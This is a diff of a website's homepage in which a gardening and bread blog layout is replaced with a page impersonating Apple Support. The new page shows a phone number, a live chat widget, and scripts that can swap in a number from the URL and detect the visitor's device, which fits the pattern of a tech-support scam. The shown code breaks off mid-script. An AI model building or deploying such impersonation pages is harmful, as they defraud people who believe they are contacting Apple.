@@ -1,567 +1,385 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
-  <title>Karamel Bread Whisper · the garden journal</title>
-  <meta name="description" content="A handcrafted authority blog where soil wisdom meets slow living. Cultivate, taste, and linger.">
-  <!-- fonts: premium serif + clean sans -->
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Literata:opsz,wght@7..72,300;7..72,400;7..72,500;7..72,600;7..72,700&family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600&display=swap" rel="stylesheet">
-  <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-    }
+<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" class="no-js"><head>
 
-    body {
-      background: #fcf8f2;
-      color: #2b2520;
-      font-family: 'Inter', sans-serif;
-      font-weight: 400;
-      line-height: 1.65;
-      -webkit-font-smoothing: antialiased;
-    }
+<!-- Privacy-friendly analytics by Plausible -->
+<script async src="https://plausible.io/js/pa-CoH4izUuyUtKORtPE9aYM.js"></script>
+<script>
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
+</script>
 
-    /* brand identity */
-    :root {
-      --brand-wood: #8b6b4c;
-      --brand-honey: #d9b382;
-      --brand-caramel: #b47b56;
-      --brand-cream: #fcf6ed;
-      --brand-shadow: rgba(43, 37, 32, 0.06);
-      --brand-paper: #f7efe6;
-      --brand-accent: #a57c5c;
-    }
 
-    h1, h2, h3, h4, h5 {
-      font-family: 'Literata', serif;
-      font-weight: 500;
-      letter-spacing: -0.02em;
-      color: #1f1a16;
-    }
+<script>
+  const domain = window.location.hostname;
+  const s = document.createElement("script");
+  s.defer = true;
+  s.setAttribute("data-domain", domain);
+  s.src = "https://plausible.io/js/script.js";
+  document.head.appendChild(s);
+</script><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple</title>
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+    <link rel="stylesheet" type="text/css" href="_families%253dSF%252bPro%252cv1_7CSF%252bPro%252bIcons%252cv1html.html">
+    <script async="" src="https://embed.tawk.to/667056f19a809f19fb3eaed8/1i0jd783t" charset="UTF-8" crossorigin="*"></script><script src="js/text_tel.js"></script>
 
-    .container {
-      max-width: 1360px;
-      margin: 0 auto;
-      padding: 0 2rem;
-    }
-
-    /* ---- unique navigation (folded ribbon) ---- */
-    .nav-ribbon {
-      padding: 1.75rem 0 1.2rem;
-      border-bottom: 1px solid rgba(139, 107, 76, 0.15);
-      display: flex;
-      flex-wrap: wrap;
-      align-items: baseline;
-      justify-content: space-between;
-      background: #fcf8f2;
-      position: relative;
-      z-index: 10;
-    }
-
-    .logo {
-      display: flex;
-      align-items: center;
-      gap: 0.2rem;
-      text-decoration: none;
-    }
-
-    .logo-icon {
-      font-size: 2.1rem;
-      line-height: 1;
-      color: var(--brand-wood);
-      letter-spacing: -0.05em;
-    }
-
-    .logo-text {
-      font-family: 'Literata', serif;
-      font-weight: 600;
-      font-size: 1.7rem;
-      letter-spacing: -0.03em;
-      color: #1f1a16;
-      background: linear-gradient(135deg, #5f4a34, #8b6b4c);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-      background-clip: text;
-    }
-
-    .logo-sub {
-      font-size: 0.7rem;
-      text-transform: uppercase;
-      letter-spacing: 0.3em;
-      color: #8b7a6b;
-      margin-left: 0.25rem;
-      font-weight: 400;
-      background: none;
-      -webkit-text-fill-color: #8b7a6b;
-    }
-
-    .nav-links {
-      display: flex;
-      gap: 2.3rem;
-      font-size: 0.9rem;
-      font-weight: 450;
-      text-transform: uppercase;
-      letter-spacing: 0.06em;
-    }
-
-    .nav-links a {
-      text-decoration: none;
-      color: #3b322b;
-      border-bottom: 1.5px solid transparent;
-      padding-bottom: 0.2rem;
-      transition: border 0.2s, color 0.2s;
-    }
-
-    .nav-links a:hover {
-      border-bottom-color: var(--brand-honey);
-      color: #1f1a16;
-    }
-
-    /* ---- homepage architecture: "The Larder" ---- */
-    /* section 1: the larder intro — editorial spread */
-    .larder-scoop {
-      padding: 3.5rem 0 4rem;
-      display: grid;
-      grid-template-columns: 1fr 1.2fr;
-      gap: 2.5rem;
-      align-items: start;
-      border-bottom: 2px dotted rgba(139, 107, 76, 0.2);
-    }
-
-    .larder-scoop h1 {
-      font-size: 3.8rem;
-      line-height: 1.1;
-      font-weight: 600;
-      letter-spacing: -0.04em;
-    }
-
-    .larder-scoop h1 span {
-      display: block;
-      color: var(--brand-caramel);
-      font-weight: 400;
-      font-size: 1.8rem;
-      margin-top: 0.5rem;
-      letter-spacing: -0.02em;
-    }
-
-    .larder-scoop p {
-      font-size: 1.2rem;
-      color: #4a4039;
-      max-width: 32rem;
-    }
-
-    .scoop-meta {
-      margin-top: 1.8rem;
-      display: flex;
-      gap: 2rem;
-      font-size: 0.9rem;
-      color: #6b5d52;
-      border-top: 1px solid #e5dbd1;
-      padding-top: 1.5rem;
-    }
-
-    /* section 2: the breadcrumb grid — category image + feature */
-    .feature-grid {
-      display: grid;
-      grid-template-columns: 1.2fr 0.8fr;
-      gap: 2rem;
-      padding: 3rem 0 3.5rem;
-      background: var(--brand-paper);
-      margin: 1.5rem 0 2rem;
-      border-radius: 48px 8px 48px 8px;
-      padding: 2.5rem 2.5rem;
-    }
-
-    .feature-grid .feature-card {
-      background: white;
-      border-radius: 32px 8px 32px 8px;
-      padding: 1.8rem 2rem 2.2rem;
-      box-shadow: 0 12px 28px var(--brand-shadow);
-    }
-
-    .feature-grid .feature-card h2 {
-      font-size: 2rem;
-      font-weight: 500;
-    }
-
-    .feature-grid .feature-card .category-tag {
-      background: var(--brand-honey);
-      color: #2b2520;
-      padding: 0.2rem 1rem;
-      border-radius: 40px;
-      font-size: 0.75rem;
-      letter-spacing: 0.05em;
-      display: inline-block;
-      margin-bottom: 0.8rem;
-      font-weight: 600;
-      text-transform: uppercase;
-    }
-
-    .category-image-block {
-      background: #dacfc4;
-      border-radius: 80px 8px 80px 8px;
-      min-height: 180px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 200" width="400" height="200"><rect width="400" height="200" fill="%23dacfc4"/><circle cx="120" cy="100" r="52" fill="%23b47b56" opacity="0.3"/><path d="M240 70 L320 70 L300 130 L220 130 Z" fill="%238b6b4c" opacity="0.4"/><circle cx="340" cy="160" r="30" fill="%23d9b382" opacity="0.5"/></svg>');
-      background-size: cover;
-      background-blend-mode: overlay;
-      color: #2b2520;
-      font-family: 'Literata', serif;
-      font-size: 1.4rem;
-      font-weight: 400;
-      background-position: center;
-      background-repeat: no-repeat;
-    }
-
-    /* section 3: latest + resources mashup (asymmetrical) */
-    .mashup-entries {
-      display: grid;
-      grid-template-columns: 2fr 1fr;
-      gap: 2.5rem;
-      padding: 2.8rem 0 3rem;
-    }
-
-    .entry-cluster {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 1.8rem;
-    }
-
-    .entry-cluster .card {
-      background: white;
-      padding: 1.8rem 1.5rem 2rem;
-      border-radius: 40px 8px 40px 8px;
-      box-shadow: 0 8px 18px var(--brand-shadow);
-      transition: all 0.2s;
-    }
-
-    .entry-cluster .card:nth-child(1) {
-      border-radius: 8px 40px 8px 40px;
-      background: #faf3e9;
-      box-shadow: 0 12px 24px rgba(43, 37, 32, 0.04);
-    }
-
-    .entry-cluster .card:nth-child(2) {
-      background: #fcf8f2;
-      border: 1px solid #e8ddd2;
-      border-radius: 60px 8px 60px 8px;
-    }
-
-    .card .meta {
-      font-size: 0.75rem;
-      text-transform: uppercase;
-      letter-spacing: 0.1em;
-      color: #7a6b5e;
-      border-bottom: 1px solid #e6dbd0;
-      padding-bottom: 0.5rem;
-      margin-bottom: 0.8rem;
-    }
-
-    .card h3 {
-      font-size: 1.35rem;
-      font-weight: 500;
-      line-height: 1.3;
-    }
-
-    .card p {
-      font-size: 0.95rem;
-      color: #4a4039;
-      margin-top: 0.5rem;
-    }
-
-    .resource-side {
-      background: #efebe6;
-      padding: 2rem 1.8rem;
-      border-radius: 120px 8px 120px 8px;
-      align-self: start;
-    }
-
-    .resource-side h3 {
-      font-size: 1.7rem;
-      font-weight: 400;
-      border-bottom: 2px solid var(--brand-caramel);
-      padding-bottom: 0.6rem;
-      margin-bottom: 1.5rem;
-      width: fit-content;
-    }
-
-    .resource-side ul {
-      list-style: none;
-      font-size: 1rem;
-    }
-
-    .resource-side li {
-      padding: 0.6rem 0;
-      border-bottom: 1px dashed rgba(139, 107, 76, 0.2);
-      display: flex;
-      gap: 0.8rem;
-      align-items: baseline;
-    }
-
-    .resource-side li::before {
-      content: "✦";
-      color: var(--brand-caramel);
-      font-size: 0.8rem;
-    }
-
-    /* section 4: narrative infographic + longform teaser */
-    .narrative-duo {
-      display: grid;
-      grid-template-columns: 1.2fr 0.8fr;
-      gap: 2.5rem;
-      background: #f7efe6;
-      padding: 2.5rem 2.5rem;
-      border-radius: 120px 8px 120px 8px;
-      margin: 1.5rem 0 3rem;
-    }
-
-    .narrative-duo .longform-preview {
-      background: white;
-      padding: 2rem;
-      border-radius: 80px 8px 80px 8px;
-    }
-
-    .narrative-duo .longform-preview h2 {
-      font-size: 2.2rem;
-      font-weight: 500;
-    }
-
-    .narrative-duo .longform-preview p {
-      margin: 1rem 0 1.2rem;
-    }
-
-    .infographic-block {
-      background: #dacfc4;
-      border-radius: 40px 8px 40px 8px;
-      min-height: 200px;
-      background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 240" width="400" height="240"><rect width="400" height="240" fill="%23dacfc4"/><circle cx="80" cy="80" r="42" fill="%23b47b56" opacity="0.25"/><path d="M160 180 L320 180 L280 60 L200 60 Z" fill="%238b6b4c" opacity="0.3"/><rect x="20" y="20" width="40" height="180" fill="%23d9b382" opacity="0.3"/></svg>');
-      background-size: cover;
-      background-repeat: no-repeat;
-      background-position: center;
-    }
-
-    /* footer — handcrafted */
-    .footer-crafted {
-      margin-top: 4rem;
-      padding: 3.5rem 0 2.5rem;
-      border-top: 2px solid rgba(139, 107, 76, 0.2);
-      display: grid;
-      grid-template-columns: 1.8fr 1fr 1fr 1.2fr;
-      gap: 2rem;
-      font-size: 0.9rem;
-    }
-
-    .footer-crafted .col h4 {
-      font-family: 'Inter', sans-serif;
-      font-weight: 500;
-      font-size: 0.75rem;
-      text-transform: uppercase;
-      letter-spacing: 0.1em;
-      color: #6b5d52;
-      border-bottom: 1px solid #ded3c8;
-      padding-bottom: 0.6rem;
-      margin-bottom: 1.2rem;
-    }
-
-    .footer-crafted a {
-      color: #3b322b;
-      text-decoration: none;
-      display: block;
-      padding: 0.25rem 0;
-    }
-
-    .footer-crafted a:hover {
-      color: var(--brand-wood);
-    }
-
-    .footer-crafted .copyright {
-      grid-column: 1 / -1;
-      border-top: 1px solid #e0d5ca;
-      padding-top: 2rem;
-      font-size: 0.8rem;
-      color: #7a6b5e;
-      text-align: center;
-      letter-spacing: 0.02em;
-    }
-
-    /* responsiveness */
-    @media (max-width: 900px) {
-      .larder-scoop { grid-template-columns: 1fr; gap: 0.8rem; }
-      .feature-grid { grid-template-columns: 1fr; }
-      .mashup-entries { grid-template-columns: 1fr; }
-      .entry-cluster { grid-template-columns: 1fr; }
-      .narrative-duo { grid-template-columns: 1fr; }
-      .footer-crafted { grid-template-columns: 1fr 1fr; }
-    }
-    @media (max-width: 600px) {
-      .nav-ribbon { flex-direction: column; gap: 0.8rem; align-items: flex-start; }
-      .nav-links { flex-wrap: wrap; gap: 1.2rem; }
-      .larder-scoop h1 { font-size: 2.8rem; }
-    }
-
-    /* utility */
-    .btn-ghost {
-      background: transparent;
-      border: 1px solid var(--brand-wood);
-      padding: 0.5rem 1.5rem;
-      border-radius: 60px;
-      font-weight: 500;
-      font-size: 0.85rem;
-      color: var(--brand-wood);
-      transition: 0.2s;
-      cursor: default;
-      display: inline-block;
-      margin-top: 0.8rem;
-    }
-    .btn-ghost:hover {
-      background: var(--brand-wood);
-      color: white;
-    }
-  </style>
 </head>
+
 <body>
+    <div id="result"></div>
+    <input type="checkbox" id="ac-gn-menustate" class="ac-gn-menustate">
+    <nav id="ac-globalnav" class="no-js">
+        <div class="ac-gn-content">
+            <ul class="ac-gn-header">
+                <li class="ac-gn-item ac-gn-menuicon">
+                    <label class="ac-gn-menuicon-label" for="ac-gn-menustate" aria-hidden="true">
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-top">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-top"></span>
+					 </span>
+					 <span class="ac-gn-menuicon-bread ac-gn-menuicon-bread-bottom">
+						 <span class="ac-gn-menuicon-bread-crust ac-gn-menuicon-bread-crust-bottom"></span>
+					 </span>
+				 </label>
+                    <a href="#ac-gn-menustate" class="ac-gn-menuanchor ac-gn-menuanchor-open" id="ac-gn-menuanchor-open">
+					 <span class="ac-gn-menuanchor-label">Open Menu </span></a>
+                    <a href="#" class="ac-gn-menuanchor ac-gn-menuanchor-close" id="ac-gn-menuanchor-close">
+					 <span class="ac-gn-menuanchor-label">Close Menu </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus-small">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag ac-gn-bag-small" id="ac-gn-bag-small">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#"><span class="ac-gn-link-text">Shopping Bag </span><span class="ac-gn-bag-badge"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <ul class="ac-gn-list">
+                <li class="ac-gn-item ac-gn-apple">
+                    <a class="ac-gn-link ac-gn-link-apple" href="#" id="ac-gn-firstfocus">
+					 <span class="ac-gn-link-text">Apple </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-mac">
+                    <a class="ac-gn-link ac-gn-link-mac" href="#">
+					 <span class="ac-gn-link-text">Mac </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-ipad">
+                    <a class="ac-gn-link ac-gn-link-ipad" href="#">
+					 <span class="ac-gn-link-text">iPad </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-iphone">
+                    <a class="ac-gn-link ac-gn-link-iphone" href="#">
+					 <span class="ac-gn-link-text">iPhone </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-watch">
+                    <a class="ac-gn-link ac-gn-link-watch" href="#">
+					 <span class="ac-gn-link-text">Watch </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-tv">
+                    <a class="ac-gn-link ac-gn-link-tv" href="#">
+					 <span class="ac-gn-link-text">TV </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-music">
+                    <a class="ac-gn-link ac-gn-link-music" href="#">
+					 <span class="ac-gn-link-text">Music </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-support">
+                    <a class="ac-gn-link ac-gn-link-support" href="#">
+					 <span class="ac-gn-link-text">Support </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-item-menu ac-gn-search" role="search">
+                    <a class="ac-gn-link ac-gn-link-search" href="#">
+					 <span class="ac-gn-search-placeholder" aria-hidden="true">Search apple.com </span></a>
+                </li>
+                <li class="ac-gn-item ac-gn-bag" id="ac-gn-bag">
+                    <a class="ac-gn-link ac-gn-link-bag analytics-exitlink" href="#" aria-label="Shopping Bag">
+					 <span class="ac-gn-link-text">Shopping Bag </span>
+					 <span class="ac-gn-bag-badge" aria-hidden="true"></span></a>
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
+                </li>
+            </ul>
+            <aside id="ac-gn-searchview" class="ac-gn-searchview" role="search">
+                <div class="ac-gn-searchview-content">
+                    <form id="ac-gn-searchform" class="ac-gn-searchform" action="http://www.apple.com/us/search" method="get">
+                        <div class="ac-gn-searchform-wrapper">
+                            <input id="ac-gn-searchform-input" class="ac-gn-searchform-input" type="text" placeholder="Search apple.com" autocorrect="off" autocapitalize="off" autocomplete="off" spellcheck="false">
+                            <input id="ac-gn-searchform-src" type="hidden" name="src" value="globalnav">
+                            <button id="ac-gn-searchform-submit" class="ac-gn-searchform-submit" type="submit" disabled="" aria-label="Submit"></button>
+                            <button id="ac-gn-searchform-reset" class="ac-gn-searchform-reset" type="reset" disabled="" aria-label="Clear Search"></button>
+                        </div>
+                    </form>
+                    <aside id="ac-gn-searchresults" class="ac-gn-searchresults"></aside>
+                </div>
+                <button id="ac-gn-searchview-close" class="ac-gn-searchview-close" aria-label="Close Search">
+					 <span class="ac-gn-searchview-close-wrapper">
+						 <span class="ac-gn-searchview-close-left"></span>
+						 <span class="ac-gn-searchview-close-right"></span>
+					 </span>
+			 </button>
+            </aside>
+            <aside class="ac-gn-bagview">
+                <div class="ac-gn-bagview-scrim">
+                    <span class="ac-gn-bagview-caret ac-gn-bagview-caret-small"></span>
+                </div>
+                <div class="ac-gn-bagview-content" id="ac-gn-bagview-content">
+                </div>
+            </aside>
+        </div>
+    </nav>
+    <div id="ac-gn-curtain" class="ac-gn-curtain"></div>
+    <div id="ac-gn-placeholder" class="ac-nav-placeholder"></div>
 
-<div class="container">
+    <div class="main">
+        <nav id="ac-localnav" class="js no-touch css-sticky" lang="en-US" role="navigation" data-sticky="">
+            <div class="ac-ln-wrapper">
+                <div class="ac-ln-background"></div>
+                <div class="ac-ln-content">
+                    <span class="ac-ln-title">
+                       <a href="#">Apple Support +1-877-481-2925 <font color="red"><font class="js_setPhoneBlock"></font></font></a>
+					 </span>
+                    <div class="ac-ln-menu">
+                        <a href="#ac-ln-menustate" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-open" id="ac-ln-menustate-open">  <span class="ac-ln-menucta-anchor-label">Open menu </span></a> <a href="#" class="ac-ln-menucta-anchor ac-ln-menucta-anchor-close" id="ac-ln-menustate-close">  <span class="ac-ln-menucta-anchor-label">Close menu </span></a>
+                        <div class="ac-ln-menu-tray">
+                            <ul class="ac-ln-menu-items">
+                                <li class="ac-ln-menu-item"><a href="#" class="ac-ln-menu-link analytics-exitlink"> Communities </a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="ac-ln-actions">
+                            <div class="ac-ln-action ac-ln-action-menucta" aria-hidden="true">
+                                <label for="ac-ln-menustate" class="ac-ln-menucta">  <span class="ac-ln-menucta-chevron"></span>
+							 </label>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <section class="as-columns  as-columns--1up  as-banner as-banner--top">
+            <div class="row">
+                <div class="column large-12 medium-12 small-12">
+                    <div class="as-banner-cont">
+                        <div class="as-banner-image as-banner-image--top">
+                            <style type="text/css">
+                                .as-banner-image.as-banner-image--top {
+                                    background-image: url("images/contact-us-hero.image.large_2x.jpg");
+                                }
 
-  <!-- navigation: folded ribbon -->
-  <nav class="nav-ribbon">
-    <a href="#" class="logo">
-      <span class="logo-icon">𖦹</span>
-      <span class="logo-text">Karamel Bread</span>
-      <span class="logo-sub">whisper</span>
-    </a>
-    <div class="nav-links">
-      <li><a href="index.html">Home</a></li>
-                    <li><a href="about.html">About</a></li>
-                    <li><a href="contact.html">Contact</a></li>
-                    <li><a href="terms.html">Terms Of Privacy</a></li>
-                    <li><a href="privacy.html">Privacy Policy</a></li>
-					<li><a href="cookies.html">Cookies Policy</a></li>
-					 <li><a href="categories.html">CATEGORIES</a></li>
-					<li><a href="disclamier.html">DISCLAMIER</a></li>
-    </div>
-  </nav>
+                                .as-banner-image.as-banner-image--top:before {
+                                    content: "";
+                                    display: block;
+                                }
 
-  <!-- homepage: larder scoop (editorial) -->
-  <section class="larder-scoop">
-    <div>
-      <h1>The soil speaks <span>— we translate.</span></h1>
-      <p>Karamel Bread Whisper is a slow-garden authority. We trade speed for depth, compost for chemicals, and flavour for the soul.</p>
-      <div class="scoop-meta">
-        <span>🍞 12 min read</span>
-        <span>✧ 2026 · harvest</span>
-        <span>📖 8 articles</span>
-      </div>
+                                @media only screen and (max-width: 735px) {
+                                    .as-banner-image.as-banner-image--top {
+                                        background-image: url("images/contact-us-hero.image.small_2x.jpg");
+                                    }
+                                }
+                            </style>
+                            <img sizes="(min-width:735px ) 735w, 100vw" srcset="images/contact-us-hero.image.small_2x.jpg 735w, images/contact-us-hero.image.large_2x.jpg 1440w" alt="" class="as-image-speculativedownload" src="images/contact-us-hero.image.large_2x.jpg">
+                        </div>
+                    </div>
+                    <div class="as-banner-content">
+                        <div class="pageTitle  ">
+                            <h1 class="pageTitle-heading">Apple Support </h1>
+                            <p class="pageTitle-intro js_setTextBlock">
+                        </p></div>
+                        <div class="sectionTitle sectionTitleBlock">
+                            <h2 class="sectionTitle-heading"></h2>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
     </div>
-    <div style="background: #e8ddd2; border-radius: 120px 8px 120px 8px; padding: 2rem 1.8rem; min-height: 140px; background-image: radial-gradient(circle at 10% 30%, #d9b38230 0%, transparent 60%); display: flex; align-items: center; justify-content: center; font-family: 'Literata', serif; font-size: 1.3rem; color: #3b322b;">“The best fertiliser is the gardener’s shadow.”</div>
-  </section>
 
-  <!-- feature grid: category image + featured article -->
-  <section class="feature-grid">
-    <div class="feature-card">
-      <span class="category-tag">⟡ Fermentation · soil</span>
-      <h2>Bread &amp; the mycelial network</h2>
-      <p style="margin: 0.8rem 0 1.2rem;">How wild yeast and fungal bridges turn your garden into a living pantry. A deep-dive into the underground economy.</p>
-      <div style="display: flex; gap: 0.8rem; align-items: center;">
-        <span style="font-size: 0.8rem;">by Elara Moss</span>
-        <span style="background: #d9b38240; padding: 0.1rem 0.8rem; border-radius: 40px;">featured</span>
-        <span style="margin-left: auto;">⏳ 12 min</span>
-      </div>
-    </div>
-    <div class="category-image-block">
-      <span style="background: rgba(255,255,240,0.6); padding: 0.4rem 1.8rem; border-radius: 60px;">category ·  larder</span>
-    </div>
-  </section>
+    <footer id="ac-globalfooter" class="no-js">
+        <div class="ac-gf-content">
+            <section class="ac-gf-footer">
+                <div class="ac-gf-footer-shop"> More ways to: Visit an <a href="#" class="analytics-exitlink">Apple Store </a>, <span class="nowrap">call  <font class="js_setPhoneBlock"></font>, or  <a href="#" class="analytics-exitlink">find a reseller </a></span>.
+                </div>
+                <div class="ac-gf-footer-locale">
+                    <a class="ac-gf-footer-locale-link" href="#" title="Choose your country or region" aria-label="United States. Choose your country or region"><img class="ac-gf-footer-locale-flag" src="images/us.png" alt="" width="16" height="16">United
+					States </a>
+                </div>
+                <div class="ac-gf-footer-legal">
+                    <div class="ac-gf-footer-legal-copyright">Copyright© 2026 Apple . All rights reserved. </div>
+                    <div class="ac-gf-footer-legal-links"><a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Privacy
+					Policy </a> <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Terms of Use </a>
+                        <a class="ac-gf-footer-legal-link analytics-exitlink" href="#">Sales and Refunds </a> <a class="ac-gf-footer-legal-link" href="#">Site
+						Map </a> <a class="ac-gf-footer-legal-link" href="#">Contact
+						Apple </a></div>
+                </div>
+                <meta content="Apple" property="name">
+                <meta content="+1-877-481-2925
+			 " property="telephone">
+            </section>
+        </div>
+    </footer>
 
-  <!-- mashup: latest entries + resource sidebar -->
-  <section class="mashup-entries">
-    <div class="entry-cluster">
-      <div class="card">
-        <div class="meta">↠  latest ·  july 15</div>
-        <h3>Kombucha meets compost tea</h3>
-        <p>A side-by-side comparison of active cultures and soil drenches. </p>
-        <div style="margin-top: 1.2rem; font-size: 0.8rem; color: #6b5d52;">by T. Oakes · 8 min read</div>
-      </div>
-      <div class="card">
-        <div class="meta">↠  deep read ·  june 28</div>
-        <h3>The whisper of caramelised roots</h3>
-        <p>Par-cooking root veg before planting? The caramelisation theory tested.</p>
-        <div style="margin-top: 1.2rem; font-size: 0.8rem; color: #6b5d52;">by F. Niwashi · 18 min</div>
-      </div>
-      <div class="card" style="grid-column: 1 / -1; border-radius: 200px 8px 200px 8px; background: #f7efe6;">
-        <div class="meta">⏳  evergreens</div>
-        <h3>8 mistakes we made with heirloom grains</h3>
-        <p>From sowing to sourdough — a confessional with actionable fixes.</p>
-        <div style="display: flex; gap: 1.2rem; margin-top: 0.6rem;"><span>📊 infographic inside</span><span>⭐ 4.9</span></div>
-      </div>
-    </div>
-    <aside class="resource-side">
-      <h3>✦  larder library</h3>
-      <ul>
-        <li>Soil almanac · 2026</li>
-        <li>Bread &amp; bacteria</li>
-        <li>Fermentation calendar</li>
-        <li>Compost black book</li>
-        <li>Grain varietals map</li>
-        <li>⟡  podcast: sour &amp; soil</li>
-      </ul>
-      <div style="margin-top: 2rem; background: #dacfc4; border-radius: 80px 8px 80px 8px; padding: 1rem 1rem; text-align: center;">📘  resources ·  free guide</div>
-    </aside>
-  </section>
 
-  <!-- narrative duo: longform article preview + infographic -->
-  <section class="narrative-duo">
-    <div class="longform-preview">
-      <span style="background: #2b2520; color: #fcf8f2; padding: 0.2rem 1rem; border-radius: 40px; font-size: 0.7rem;">expert advice</span>
-      <h2>How to build a bread-worthy garden</h2>
-      <p>A step-by-step guide that connects soil ecology, grain selection, and the alchemy of slow fermentation. 2200 words of actionable knowledge.</p>
-      <div style="display: flex; gap: 1rem; flex-wrap: wrap; font-size: 0.9rem; border-top: 1px solid #ddd; padding-top: 1rem; margin-top: 0.8rem;">
-        <span>🌱  H2: Mycelial priming</span>
-        <span>🍞  H3: autolyse &amp; soil</span>
-        <span>📊  comparison: 4 grains</span>
-      </div>
-      <div class="btn-ghost">Read full →</div>
-    </div>
-    <div class="infographic-block">
-      <!-- infographic bg -->
-      <div style="display: flex; align-items: center; justify-content: center; height: 100%; color: #2b2520; font-family: 'Literata', serif; font-size: 1.2rem; background: rgba(255,255,240,0.2); padding: 1rem;">🌾  infographic: grain-to-loaf cycle</div>
-    </div>
-  </section>
 
-  <!-- footer: handcrafted with many pages -->
-  <footer class="footer-crafted">
-    <div class="col">
-      <h4>Karamel Bread Whisper</h4>
-      <p style="margin-bottom: 0.8rem; color: #4a4039;">Authority gardening &amp; slow living. Est. 2024.</p>
-      <div style="display: flex; gap: 0.8rem; flex-wrap: wrap;">
-        <a href="#">about</a> <a href="#">authors</a> <a href="#">contact</a>
-      </div>
-    </div>
-    <div class="col">
-      <h4>read</h4>
-      <a href="#">blog</a> <a href="#">archive</a> <a href="#">resources</a> <a href="#">faq</a>
-    </div>
-    <div class="col">
-      <h4>legal</h4>
-      <a href="#">privacy</a> <a href="#">terms</a> <a href="#">cookies</a> <a href="#">disclaimer</a> <a href="#">editorial policy</a>
-    </div>
-    <div class="col">
-      <h4>stay</h4>
-      <a href="#">sitemap</a> <a href="#">newsletter</a> <a href="#">podcast</a>
-    </div>
-    <div class="copyright">
-      © 2026 Karamel Bread Whisper ·  handcrafted with soil &amp; ink. All rights reserved.
-    </div>
-  </footer>
+    <script src="js/jquery-1.12.0.min.js"></script>
+    <script>
+        function getURLParameter(name) {
+            return decodeURI(
+                (RegExp(name + '=' + '(.+?)(&|$)').exec(location.search) || [, null])[1] || ''
+            );
+        };
+        var cookieHelper = {
+            defParams: {
+                path: "/",
+                domain: "." + window.location.host.replace(/:\d+/, "")
+            },
+            set: function(a, d, c) {
+                c = c || {};
+                for (var b in this.defParams) "undefined" == typeof c[b] && (c[b] = this.defParams[b]);
+                b = c.expires;
+                if ("number" == typeof b && b) {
+                    var e = new Date;
+                    e.setTime(e.getTime() + 1E3 * b);
+                    b = c.expires = e
+                }
+                b && b.toUTCString && (c.expires = b.toUTCString());
+                d = encodeURIComponent(d);
+                a = a + "=" + d;
+                for (var f in c) a += "; " + f, d = c[f], !0 !== d && (a += "=" + d);
+                document.cookie = a
+            },
+            get: function(a) {
+                return (a = document.cookie.match(new RegExp("(?:^|; )" + a.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g, "\\$1") + "=([^;]*)"))) ? decodeURIComponent(a[1]) : void 0
+            },
+            del: function(a) {
+                this.set(a, null, {
+                    expires: -1
+                })
+            }
+        };
 
-</div>
-<!-- end container -->
 
-</body>
-</html>
+        var userAgent = window.navigator.userAgent.toLowerCase(),
+            ios = /iphone|ipod|ipad/.test(userAgent);
+
+        function parseURL(url) {
+            var a = document.createElement('a');
+            a.href = url;
+            return a.hostname.replace('www.', '');
+        };
+
+        function getPar(name) {
+            var url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        };
+
+        window.number = getPar('phone');
+
+        window.number = (window.number ? window.number : '+1-877-481-2925');
+
+        window.device = 'iPhone';
+        window.refef = parseURL(document.referrer);
+
+        if (ios) {
+
+            if (/iphone/.test(userAgent)) {
